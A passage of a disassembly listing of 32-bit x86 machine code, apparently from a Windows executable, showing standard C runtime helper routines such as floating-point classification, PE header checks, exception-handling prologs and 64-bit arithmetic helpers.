  40a660:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40a663:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a666:	e8 fd d8 ff ff       	call   0x407f68
  40a66b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40a66e:	50                   	push   %eax
  40a66f:	e8 c8 87 ff ff       	call   0x402e3c
  40a674:	83 c4 0c             	add    $0xc,%esp
  40a677:	85 c0                	test   %eax,%eax
  40a679:	75 07                	jne    0x40a682
  40a67b:	56                   	push   %esi
  40a67c:	e8 55 ff ff ff       	call   0x40a5d6
  40a681:	59                   	pop    %ecx
  40a682:	dd 45 f8             	fldl   -0x8(%ebp)
  40a685:	5e                   	pop    %esi
  40a686:	eb 1b                	jmp    0x40a6a3
  40a688:	68 ff ff 00 00       	push   $0xffff
  40a68d:	ff 75 28             	push   0x28(%ebp)
  40a690:	e8 d3 d8 ff ff       	call   0x407f68
  40a695:	ff 75 08             	push   0x8(%ebp)
  40a698:	e8 39 ff ff ff       	call   0x40a5d6
  40a69d:	dd 45 20             	fldl   0x20(%ebp)
  40a6a0:	83 c4 0c             	add    $0xc,%esp
  40a6a3:	8b e5                	mov    %ebp,%esp
  40a6a5:	5d                   	pop    %ebp
  40a6a6:	c3                   	ret
  40a6a7:	8b ff                	mov    %edi,%edi
  40a6a9:	55                   	push   %ebp
  40a6aa:	8b ec                	mov    %esp,%ebp
  40a6ac:	dd 45 08             	fldl   0x8(%ebp)
  40a6af:	d9 ee                	fldz
  40a6b1:	dd e1                	fucom  %st(1)
  40a6b3:	df e0                	fnstsw %ax
  40a6b5:	57                   	push   %edi
  40a6b6:	f6 c4 44             	test   $0x44,%ah
  40a6b9:	7a 09                	jp     0x40a6c4
  40a6bb:	dd d9                	fstp   %st(1)
  40a6bd:	33 ff                	xor    %edi,%edi
  40a6bf:	e9 af 00 00 00       	jmp    0x40a773
  40a6c4:	56                   	push   %esi
  40a6c5:	66 8b 75 0e          	mov    0xe(%ebp),%si
  40a6c9:	0f b7 c6             	movzwl %si,%eax
  40a6cc:	a9 f0 7f 00 00       	test   $0x7ff0,%eax
  40a6d1:	75 7c                	jne    0x40a74f
  40a6d3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a6d6:	8b 55 08             	mov    0x8(%ebp),%edx
  40a6d9:	f7 c1 ff ff 0f 00    	test   $0xfffff,%ecx
  40a6df:	75 04                	jne    0x40a6e5
  40a6e1:	85 d2                	test   %edx,%edx
  40a6e3:	74 6a                	je     0x40a74f
  40a6e5:	de d9                	fcompp
  40a6e7:	bf 03 fc ff ff       	mov    $0xfffffc03,%edi
  40a6ec:	df e0                	fnstsw %ax
  40a6ee:	f6 c4 41             	test   $0x41,%ah
  40a6f1:	75 05                	jne    0x40a6f8
  40a6f3:	33 c0                	xor    %eax,%eax
  40a6f5:	40                   	inc    %eax
  40a6f6:	eb 02                	jmp    0x40a6fa
  40a6f8:	33 c0                	xor    %eax,%eax
  40a6fa:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
  40a6fe:	75 1f                	jne    0x40a71f
  40a700:	03 c9                	add    %ecx,%ecx
  40a702:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40a705:	85 d2                	test   %edx,%edx
  40a707:	79 06                	jns    0x40a70f
  40a709:	83 c9 01             	or     $0x1,%ecx
  40a70c:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40a70f:	03 d2                	add    %edx,%edx
  40a711:	4f                   	dec    %edi
  40a712:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
  40a716:	74 e8                	je     0x40a700
  40a718:	66 8b 75 0e          	mov    0xe(%ebp),%si
  40a71c:	89 55 08             	mov    %edx,0x8(%ebp)
  40a71f:	b9 ef ff 00 00       	mov    $0xffef,%ecx
  40a724:	66 23 f1             	and    %cx,%si
  40a727:	66 89 75 0e          	mov    %si,0xe(%ebp)
  40a72b:	85 c0                	test   %eax,%eax
  40a72d:	74 0c                	je     0x40a73b
  40a72f:	b8 00 80 00 00       	mov    $0x8000,%eax
  40a734:	66 0b f0             	or     %ax,%si
  40a737:	66 89 75 0e          	mov    %si,0xe(%ebp)
  40a73b:	dd 45 08             	fldl   0x8(%ebp)
  40a73e:	6a 00                	push   $0x0
  40a740:	51                   	push   %ecx
  40a741:	51                   	push   %ecx
  40a742:	dd 1c 24             	fstpl  (%esp)
  40a745:	e8 31 00 00 00       	call   0x40a77b
  40a74a:	83 c4 0c             	add    $0xc,%esp
  40a74d:	eb 23                	jmp    0x40a772
  40a74f:	6a 00                	push   $0x0
  40a751:	51                   	push   %ecx
  40a752:	dd d8                	fstp   %st(0)
  40a754:	51                   	push   %ecx
  40a755:	dd 1c 24             	fstpl  (%esp)
  40a758:	e8 1e 00 00 00       	call   0x40a77b
  40a75d:	0f b7 fe             	movzwl %si,%edi
  40a760:	83 c4 0c             	add    $0xc,%esp
  40a763:	c1 ef 04             	shr    $0x4,%edi
  40a766:	81 e7 ff 07 00 00    	and    $0x7ff,%edi
  40a76c:	81 ef fe 03 00 00    	sub    $0x3fe,%edi
  40a772:	5e                   	pop    %esi
  40a773:	8b 45 10             	mov    0x10(%ebp),%eax
  40a776:	89 38                	mov    %edi,(%eax)
  40a778:	5f                   	pop    %edi
  40a779:	5d                   	pop    %ebp
  40a77a:	c3                   	ret
  40a77b:	8b ff                	mov    %edi,%edi
  40a77d:	55                   	push   %ebp
  40a77e:	8b ec                	mov    %esp,%ebp
  40a780:	51                   	push   %ecx
  40a781:	51                   	push   %ecx
  40a782:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a785:	0f b7 45 0e          	movzwl 0xe(%ebp),%eax
  40a789:	dd 45 08             	fldl   0x8(%ebp)
  40a78c:	25 0f 80 00 00       	and    $0x800f,%eax
  40a791:	dd 5d f8             	fstpl  -0x8(%ebp)
  40a794:	8d 89 fe 03 00 00    	lea    0x3fe(%ecx),%ecx
  40a79a:	c1 e1 04             	shl    $0x4,%ecx
  40a79d:	0b c8                	or     %eax,%ecx
  40a79f:	66 89 4d fe          	mov    %cx,-0x2(%ebp)
  40a7a3:	dd 45 f8             	fldl   -0x8(%ebp)
  40a7a6:	8b e5                	mov    %ebp,%esp
  40a7a8:	5d                   	pop    %ebp
  40a7a9:	c3                   	ret
  40a7aa:	8b ff                	mov    %edi,%edi
  40a7ac:	55                   	push   %ebp
  40a7ad:	8b ec                	mov    %esp,%ebp
  40a7af:	81 7d 0c 00 00 f0 7f 	cmpl   $0x7ff00000,0xc(%ebp)
  40a7b6:	8b 45 08             	mov    0x8(%ebp),%eax
  40a7b9:	75 07                	jne    0x40a7c2
  40a7bb:	85 c0                	test   %eax,%eax
  40a7bd:	75 15                	jne    0x40a7d4
  40a7bf:	40                   	inc    %eax
  40a7c0:	5d                   	pop    %ebp
  40a7c1:	c3                   	ret
  40a7c2:	81 7d 0c 00 00 f0 ff 	cmpl   $0xfff00000,0xc(%ebp)
  40a7c9:	75 09                	jne    0x40a7d4
  40a7cb:	85 c0                	test   %eax,%eax
  40a7cd:	75 05                	jne    0x40a7d4
  40a7cf:	6a 02                	push   $0x2
  40a7d1:	58                   	pop    %eax
  40a7d2:	5d                   	pop    %ebp
  40a7d3:	c3                   	ret
  40a7d4:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
  40a7d8:	ba f8 7f 00 00       	mov    $0x7ff8,%edx
  40a7dd:	66 23 ca             	and    %dx,%cx
  40a7e0:	66 3b ca             	cmp    %dx,%cx
  40a7e3:	75 04                	jne    0x40a7e9
  40a7e5:	6a 03                	push   $0x3
  40a7e7:	eb e8                	jmp    0x40a7d1
  40a7e9:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
  40a7ee:	66 3b ca             	cmp    %dx,%cx
  40a7f1:	75 11                	jne    0x40a804
  40a7f3:	f7 45 0c ff ff 07 00 	testl  $0x7ffff,0xc(%ebp)
  40a7fa:	75 04                	jne    0x40a800
  40a7fc:	85 c0                	test   %eax,%eax
  40a7fe:	74 04                	je     0x40a804
  40a800:	6a 04                	push   $0x4
  40a802:	eb cd                	jmp    0x40a7d1
  40a804:	33 c0                	xor    %eax,%eax
  40a806:	5d                   	pop    %ebp
  40a807:	c3                   	ret
  40a808:	8b ff                	mov    %edi,%edi
  40a80a:	55                   	push   %ebp
  40a80b:	8b ec                	mov    %esp,%ebp
  40a80d:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
  40a811:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
  40a816:	66 8b c1             	mov    %cx,%ax
  40a819:	66 23 c2             	and    %dx,%ax
  40a81c:	66 3b c2             	cmp    %dx,%ax
  40a81f:	75 33                	jne    0x40a854
  40a821:	dd 45 08             	fldl   0x8(%ebp)
  40a824:	51                   	push   %ecx
  40a825:	51                   	push   %ecx
  40a826:	dd 1c 24             	fstpl  (%esp)
  40a829:	e8 7c ff ff ff       	call   0x40a7aa
  40a82e:	59                   	pop    %ecx
  40a82f:	59                   	pop    %ecx
  40a830:	83 e8 01             	sub    $0x1,%eax
  40a833:	74 18                	je     0x40a84d
  40a835:	83 e8 01             	sub    $0x1,%eax
  40a838:	74 0e                	je     0x40a848
  40a83a:	83 e8 01             	sub    $0x1,%eax
  40a83d:	74 05                	je     0x40a844
  40a83f:	33 c0                	xor    %eax,%eax
  40a841:	40                   	inc    %eax
  40a842:	5d                   	pop    %ebp
  40a843:	c3                   	ret
  40a844:	6a 02                	push   $0x2
  40a846:	eb 02                	jmp    0x40a84a
  40a848:	6a 04                	push   $0x4
  40a84a:	58                   	pop    %eax
  40a84b:	5d                   	pop    %ebp
  40a84c:	c3                   	ret
  40a84d:	b8 00 02 00 00       	mov    $0x200,%eax
  40a852:	5d                   	pop    %ebp
  40a853:	c3                   	ret
  40a854:	0f b7 c9             	movzwl %cx,%ecx
  40a857:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40a85d:	66 85 c0             	test   %ax,%ax
  40a860:	75 1e                	jne    0x40a880
  40a862:	f7 45 0c ff ff 0f 00 	testl  $0xfffff,0xc(%ebp)
  40a869:	75 06                	jne    0x40a871
  40a86b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40a86f:	74 0f                	je     0x40a880
  40a871:	f7 d9                	neg    %ecx
  40a873:	1b c9                	sbb    %ecx,%ecx
  40a875:	83 e1 90             	and    $0xffffff90,%ecx
  40a878:	8d 81 80 00 00 00    	lea    0x80(%ecx),%eax
  40a87e:	5d                   	pop    %ebp
  40a87f:	c3                   	ret
  40a880:	dd 45 08             	fldl   0x8(%ebp)
  40a883:	d9 ee                	fldz
  40a885:	da e9                	fucompp
  40a887:	df e0                	fnstsw %ax
  40a889:	f6 c4 44             	test   $0x44,%ah
  40a88c:	7a 0c                	jp     0x40a89a
  40a88e:	f7 d9                	neg    %ecx
  40a890:	1b c9                	sbb    %ecx,%ecx
  40a892:	83 e1 e0             	and    $0xffffffe0,%ecx
  40a895:	8d 41 40             	lea    0x40(%ecx),%eax
  40a898:	5d                   	pop    %ebp
  40a899:	c3                   	ret
  40a89a:	f7 d9                	neg    %ecx
  40a89c:	1b c9                	sbb    %ecx,%ecx
  40a89e:	81 e1 08 ff ff ff    	and    $0xffffff08,%ecx
  40a8a4:	8d 81 00 01 00 00    	lea    0x100(%ecx),%eax
  40a8aa:	5d                   	pop    %ebp
  40a8ab:	c3                   	ret
  40a8ac:	ff 25 80 c0 40 00    	jmp    *0x40c080
  40a8b2:	ff 25 a4 c0 40 00    	jmp    *0x40c0a4
  40a8b8:	cc                   	int3
  40a8b9:	cc                   	int3
  40a8ba:	cc                   	int3
  40a8bb:	cc                   	int3
  40a8bc:	cc                   	int3
  40a8bd:	cc                   	int3
  40a8be:	cc                   	int3
  40a8bf:	cc                   	int3
  40a8c0:	55                   	push   %ebp
  40a8c1:	8b ec                	mov    %esp,%ebp
  40a8c3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a8c6:	33 d2                	xor    %edx,%edx
  40a8c8:	53                   	push   %ebx
  40a8c9:	56                   	push   %esi
  40a8ca:	57                   	push   %edi
  40a8cb:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40a8ce:	03 c8                	add    %eax,%ecx
  40a8d0:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40a8d4:	0f b7 59 06          	movzwl 0x6(%ecx),%ebx
  40a8d8:	83 c0 18             	add    $0x18,%eax
  40a8db:	03 c1                	add    %ecx,%eax
  40a8dd:	85 db                	test   %ebx,%ebx
  40a8df:	74 1b                	je     0x40a8fc
  40a8e1:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a8e4:	8b 70 0c             	mov    0xc(%eax),%esi
  40a8e7:	3b fe                	cmp    %esi,%edi
  40a8e9:	72 09                	jb     0x40a8f4
  40a8eb:	8b 48 08             	mov    0x8(%eax),%ecx
  40a8ee:	03 ce                	add    %esi,%ecx
  40a8f0:	3b f9                	cmp    %ecx,%edi
  40a8f2:	72 0a                	jb     0x40a8fe
  40a8f4:	42                   	inc    %edx
  40a8f5:	83 c0 28             	add    $0x28,%eax
  40a8f8:	3b d3                	cmp    %ebx,%edx
  40a8fa:	72 e8                	jb     0x40a8e4
  40a8fc:	33 c0                	xor    %eax,%eax
  40a8fe:	5f                   	pop    %edi
  40a8ff:	5e                   	pop    %esi
  40a900:	5b                   	pop    %ebx
  40a901:	5d                   	pop    %ebp
  40a902:	c3                   	ret
  40a903:	cc                   	int3
  40a904:	cc                   	int3
  40a905:	cc                   	int3
  40a906:	cc                   	int3
  40a907:	cc                   	int3
  40a908:	cc                   	int3
  40a909:	cc                   	int3
  40a90a:	cc                   	int3
  40a90b:	cc                   	int3
  40a90c:	cc                   	int3
  40a90d:	cc                   	int3
  40a90e:	cc                   	int3
  40a90f:	cc                   	int3
  40a910:	55                   	push   %ebp
  40a911:	8b ec                	mov    %esp,%ebp
  40a913:	6a fe                	push   $0xfffffffe
  40a915:	68 30 1a 41 00       	push   $0x411a30
  40a91a:	68 60 23 40 00       	push   $0x402360
  40a91f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40a925:	50                   	push   %eax
  40a926:	83 ec 08             	sub    $0x8,%esp
  40a929:	53                   	push   %ebx
  40a92a:	56                   	push   %esi
  40a92b:	57                   	push   %edi
  40a92c:	a1 04 30 41 00       	mov    0x413004,%eax
  40a931:	31 45 f8             	xor    %eax,-0x8(%ebp)
  40a934:	33 c5                	xor    %ebp,%eax
  40a936:	50                   	push   %eax
  40a937:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a93a:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40a940:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40a943:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40a94a:	68 00 00 40 00       	push   $0x400000
  40a94f:	e8 7c 00 00 00       	call   0x40a9d0
  40a954:	83 c4 04             	add    $0x4,%esp
  40a957:	85 c0                	test   %eax,%eax
  40a959:	74 54                	je     0x40a9af
  40a95b:	8b 45 08             	mov    0x8(%ebp),%eax
  40a95e:	2d 00 00 40 00       	sub    $0x400000,%eax
  40a963:	50                   	push   %eax
  40a964:	68 00 00 40 00       	push   $0x400000
  40a969:	e8 52 ff ff ff       	call   0x40a8c0
  40a96e:	83 c4 08             	add    $0x8,%esp
  40a971:	85 c0                	test   %eax,%eax
  40a973:	74 3a                	je     0x40a9af
  40a975:	8b 40 24             	mov    0x24(%eax),%eax
  40a978:	c1 e8 1f             	shr    $0x1f,%eax
  40a97b:	f7 d0                	not    %eax
  40a97d:	83 e0 01             	and    $0x1,%eax
  40a980:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40a987:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a98a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a991:	59                   	pop    %ecx
  40a992:	5f                   	pop    %edi
  40a993:	5e                   	pop    %esi
  40a994:	5b                   	pop    %ebx
  40a995:	8b e5                	mov    %ebp,%esp
  40a997:	5d                   	pop    %ebp
  40a998:	c3                   	ret
  40a999:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40a99c:	8b 00                	mov    (%eax),%eax
  40a99e:	33 c9                	xor    %ecx,%ecx
  40a9a0:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  40a9a6:	0f 94 c1             	sete   %cl
  40a9a9:	8b c1                	mov    %ecx,%eax
  40a9ab:	c3                   	ret
  40a9ac:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40a9af:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40a9b6:	33 c0                	xor    %eax,%eax
  40a9b8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a9bb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a9c2:	59                   	pop    %ecx
  40a9c3:	5f                   	pop    %edi
  40a9c4:	5e                   	pop    %esi
  40a9c5:	5b                   	pop    %ebx
  40a9c6:	8b e5                	mov    %ebp,%esp
  40a9c8:	5d                   	pop    %ebp
  40a9c9:	c3                   	ret
  40a9ca:	cc                   	int3
  40a9cb:	cc                   	int3
  40a9cc:	cc                   	int3
  40a9cd:	cc                   	int3
  40a9ce:	cc                   	int3
  40a9cf:	cc                   	int3
  40a9d0:	55                   	push   %ebp
  40a9d1:	8b ec                	mov    %esp,%ebp
  40a9d3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a9d6:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  40a9db:	66 39 08             	cmp    %cx,(%eax)
  40a9de:	74 04                	je     0x40a9e4
  40a9e0:	33 c0                	xor    %eax,%eax
  40a9e2:	5d                   	pop    %ebp
  40a9e3:	c3                   	ret
  40a9e4:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40a9e7:	03 c8                	add    %eax,%ecx
  40a9e9:	33 c0                	xor    %eax,%eax
  40a9eb:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  40a9f1:	75 0c                	jne    0x40a9ff
  40a9f3:	ba 0b 01 00 00       	mov    $0x10b,%edx
  40a9f8:	66 39 51 18          	cmp    %dx,0x18(%ecx)
  40a9fc:	0f 94 c0             	sete   %al
  40a9ff:	5d                   	pop    %ebp
  40aa00:	c3                   	ret
  40aa01:	cc                   	int3
  40aa02:	cc                   	int3
  40aa03:	cc                   	int3
  40aa04:	cc                   	int3
  40aa05:	cc                   	int3
  40aa06:	cc                   	int3
  40aa07:	cc                   	int3
  40aa08:	cc                   	int3
  40aa09:	cc                   	int3
  40aa0a:	cc                   	int3
  40aa0b:	cc                   	int3
  40aa0c:	cc                   	int3
  40aa0d:	cc                   	int3
  40aa0e:	cc                   	int3
  40aa0f:	cc                   	int3
  40aa10:	56                   	push   %esi
  40aa11:	8b 44 24 14          	mov    0x14(%esp),%eax
  40aa15:	0b c0                	or     %eax,%eax
  40aa17:	75 28                	jne    0x40aa41
  40aa19:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40aa1d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40aa21:	33 d2                	xor    %edx,%edx
  40aa23:	f7 f1                	div    %ecx
  40aa25:	8b d8                	mov    %eax,%ebx
  40aa27:	8b 44 24 08          	mov    0x8(%esp),%eax
  40aa2b:	f7 f1                	div    %ecx
  40aa2d:	8b f0                	mov    %eax,%esi
  40aa2f:	8b c3                	mov    %ebx,%eax
  40aa31:	f7 64 24 10          	mull   0x10(%esp)
  40aa35:	8b c8                	mov    %eax,%ecx
  40aa37:	8b c6                	mov    %esi,%eax
  40aa39:	f7 64 24 10          	mull   0x10(%esp)
  40aa3d:	03 d1                	add    %ecx,%edx
  40aa3f:	eb 47                	jmp    0x40aa88
  40aa41:	8b c8                	mov    %eax,%ecx
  40aa43:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40aa47:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40aa4b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40aa4f:	d1 e9                	shr    $1,%ecx
  40aa51:	d1 db                	rcr    $1,%ebx
  40aa53:	d1 ea                	shr    $1,%edx
  40aa55:	d1 d8                	rcr    $1,%eax
  40aa57:	0b c9                	or     %ecx,%ecx
  40aa59:	75 f4                	jne    0x40aa4f
  40aa5b:	f7 f3                	div    %ebx
  40aa5d:	8b f0                	mov    %eax,%esi
  40aa5f:	f7 64 24 14          	mull   0x14(%esp)
  40aa63:	8b c8                	mov    %eax,%ecx
  40aa65:	8b 44 24 10          	mov    0x10(%esp),%eax
  40aa69:	f7 e6                	mul    %esi
  40aa6b:	03 d1                	add    %ecx,%edx
  40aa6d:	72 0e                	jb     0x40aa7d
  40aa6f:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  40aa73:	77 08                	ja     0x40aa7d
  40aa75:	72 0f                	jb     0x40aa86
  40aa77:	3b 44 24 08          	cmp    0x8(%esp),%eax
  40aa7b:	76 09                	jbe    0x40aa86
  40aa7d:	4e                   	dec    %esi
  40aa7e:	2b 44 24 10          	sub    0x10(%esp),%eax
  40aa82:	1b 54 24 14          	sbb    0x14(%esp),%edx
  40aa86:	33 db                	xor    %ebx,%ebx
  40aa88:	2b 44 24 08          	sub    0x8(%esp),%eax
  40aa8c:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  40aa90:	f7 da                	neg    %edx
  40aa92:	f7 d8                	neg    %eax
  40aa94:	83 da 00             	sbb    $0x0,%edx
  40aa97:	8b ca                	mov    %edx,%ecx
  40aa99:	8b d3                	mov    %ebx,%edx
  40aa9b:	8b d9                	mov    %ecx,%ebx
  40aa9d:	8b c8                	mov    %eax,%ecx
  40aa9f:	8b c6                	mov    %esi,%eax
  40aaa1:	5e                   	pop    %esi
  40aaa2:	c2 10 00             	ret    $0x10
  40aaa5:	cc                   	int3
  40aaa6:	cc                   	int3
  40aaa7:	cc                   	int3
  40aaa8:	cc                   	int3
  40aaa9:	cc                   	int3
  40aaaa:	cc                   	int3
  40aaab:	cc                   	int3
  40aaac:	cc                   	int3
  40aaad:	cc                   	int3
  40aaae:	cc                   	int3
  40aaaf:	cc                   	int3
  40aab0:	68 60 23 40 00       	push   $0x402360
  40aab5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40aabc:	8b 44 24 10          	mov    0x10(%esp),%eax
  40aac0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40aac4:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  40aac8:	2b e0                	sub    %eax,%esp
  40aaca:	53                   	push   %ebx
  40aacb:	56                   	push   %esi
  40aacc:	57                   	push   %edi
  40aacd:	a1 04 30 41 00       	mov    0x413004,%eax
  40aad2:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40aad5:	33 c5                	xor    %ebp,%eax
  40aad7:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40aada:	50                   	push   %eax
  40aadb:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40aade:	ff 75 f8             	push   -0x8(%ebp)
  40aae1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40aae4:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40aaeb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40aaee:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40aaf1:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40aaf7:	f2 c3                	bnd ret
  40aaf9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40aafc:	33 cd                	xor    %ebp,%ecx
  40aafe:	f2 e8 c4 6c ff ff    	bnd call 0x4017c8
  40ab04:	f2 e9 4c 76 ff ff    	bnd jmp 0x402156
  40ab0a:	cc                   	int3
  40ab0b:	cc                   	int3
  40ab0c:	cc                   	int3
  40ab0d:	cc                   	int3
  40ab0e:	cc                   	int3
  40ab0f:	cc                   	int3
  40ab10:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ab14:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40ab18:	0b c8                	or     %eax,%ecx
  40ab1a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40ab1e:	75 09                	jne    0x40ab29
  40ab20:	8b 44 24 04          	mov    0x4(%esp),%eax
  40ab24:	f7 e1                	mul    %ecx
  40ab26:	c2 10 00             	ret    $0x10
  40ab29:	53                   	push   %ebx
  40ab2a:	f7 e1                	mul    %ecx
  40ab2c:	8b d8                	mov    %eax,%ebx
  40ab2e:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ab32:	f7 64 24 14          	mull   0x14(%esp)
  40ab36:	03 d8                	add    %eax,%ebx
  40ab38:	8b 44 24 08          	mov    0x8(%esp),%eax
  40ab3c:	f7 e1                	mul    %ecx
  40ab3e:	03 d3                	add    %ebx,%edx
  40ab40:	5b                   	pop    %ebx
  40ab41:	c2 10 00             	ret    $0x10
  40ab44:	cc                   	int3
  40ab45:	cc                   	int3
  40ab46:	cc                   	int3
  40ab47:	cc                   	int3
  40ab48:	cc                   	int3
  40ab49:	cc                   	int3
  40ab4a:	cc                   	int3
  40ab4b:	cc                   	int3
  40ab4c:	cc                   	int3
  40ab4d:	cc                   	int3
  40ab4e:	cc                   	int3
  40ab4f:	cc                   	int3
  40ab50:	51                   	push   %ecx
  40ab51:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40ab55:	2b c8                	sub    %eax,%ecx
  40ab57:	83 e1 0f             	and    $0xf,%ecx
  40ab5a:	03 c1                	add    %ecx,%eax
  40ab5c:	1b c9                	sbb    %ecx,%ecx
  40ab5e:	0b c1                	or     %ecx,%eax
  40ab60:	59                   	pop    %ecx
  40ab61:	e9 fa 01 00 00       	jmp    0x40ad60
  40ab66:	51                   	push   %ecx
  40ab67:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40ab6b:	2b c8                	sub    %eax,%ecx
  40ab6d:	83 e1 07             	and    $0x7,%ecx
  40ab70:	03 c1                	add    %ecx,%eax
  40ab72:	1b c9                	sbb    %ecx,%ecx
  40ab74:	0b c1                	or     %ecx,%eax
  40ab76:	59                   	pop    %ecx
  40ab77:	e9 e4 01 00 00       	jmp    0x40ad60
  40ab7c:	cc                   	int3
  40ab7d:	cc                   	int3
  40ab7e:	cc                   	int3
  40ab7f:	cc                   	int3
  40ab80:	57                   	push   %edi
  40ab81:	56                   	push   %esi
  40ab82:	55                   	push   %ebp
  40ab83:	33 ff                	xor    %edi,%edi
  40ab85:	33 ed                	xor    %ebp,%ebp
  40ab87:	8b 44 24 14          	mov    0x14(%esp),%eax
  40ab8b:	0b c0                	or     %eax,%eax
  40ab8d:	7d 15                	jge    0x40aba4
  40ab8f:	47                   	inc    %edi
  40ab90:	45                   	inc    %ebp
  40ab91:	8b 54 24 10          	mov    0x10(%esp),%edx
  40ab95:	f7 d8                	neg    %eax
  40ab97:	f7 da                	neg    %edx
  40ab99:	83 d8 00             	sbb    $0x0,%eax
  40ab9c:	89 44 24 14          	mov    %eax,0x14(%esp)
  40aba0:	89 54 24 10          	mov    %edx,0x10(%esp)
  40aba4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40aba8:	0b c0                	or     %eax,%eax
  40abaa:	7d 14                	jge    0x40abc0
  40abac:	47                   	inc    %edi
  40abad:	8b 54 24 18          	mov    0x18(%esp),%edx
  40abb1:	f7 d8                	neg    %eax
  40abb3:	f7 da                	neg    %edx
  40abb5:	83 d8 00             	sbb    $0x0,%eax
  40abb8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40abbc:	89 54 24 18          	mov    %edx,0x18(%esp)
  40abc0:	0b c0                	or     %eax,%eax
  40abc2:	75 28                	jne    0x40abec
  40abc4:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40abc8:	8b 44 24 14          	mov    0x14(%esp),%eax
  40abcc:	33 d2                	xor    %edx,%edx
  40abce:	f7 f1                	div    %ecx
  40abd0:	8b d8                	mov    %eax,%ebx
  40abd2:	8b 44 24 10          	mov    0x10(%esp),%eax
  40abd6:	f7 f1                	div    %ecx
  40abd8:	8b f0                	mov    %eax,%esi
  40abda:	8b c3                	mov    %ebx,%eax
  40abdc:	f7 64 24 18          	mull   0x18(%esp)
  40abe0:	8b c8                	mov    %eax,%ecx
  40abe2:	8b c6                	mov    %esi,%eax
  40abe4:	f7 64 24 18          	mull   0x18(%esp)
  40abe8:	03 d1                	add    %ecx,%edx
  40abea:	eb 47                	jmp    0x40ac33
  40abec:	8b d8                	mov    %eax,%ebx
  40abee:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40abf2:	8b 54 24 14          	mov    0x14(%esp),%edx
  40abf6:	8b 44 24 10          	mov    0x10(%esp),%eax
  40abfa:	d1 eb                	shr    $1,%ebx
  40abfc:	d1 d9                	rcr    $1,%ecx
  40abfe:	d1 ea                	shr    $1,%edx
  40ac00:	d1 d8                	rcr    $1,%eax
  40ac02:	0b db                	or     %ebx,%ebx
  40ac04:	75 f4                	jne    0x40abfa
  40ac06:	f7 f1                	div    %ecx
  40ac08:	8b f0                	mov    %eax,%esi
  40ac0a:	f7 64 24 1c          	mull   0x1c(%esp)
  40ac0e:	8b c8                	mov    %eax,%ecx
  40ac10:	8b 44 24 18          	mov    0x18(%esp),%eax
  40ac14:	f7 e6                	mul    %esi
  40ac16:	03 d1                	add    %ecx,%edx
  40ac18:	72 0e                	jb     0x40ac28
  40ac1a:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40ac1e:	77 08                	ja     0x40ac28
  40ac20:	72 0f                	jb     0x40ac31
  40ac22:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40ac26:	76 09                	jbe    0x40ac31
  40ac28:	4e                   	dec    %esi
  40ac29:	2b 44 24 18          	sub    0x18(%esp),%eax
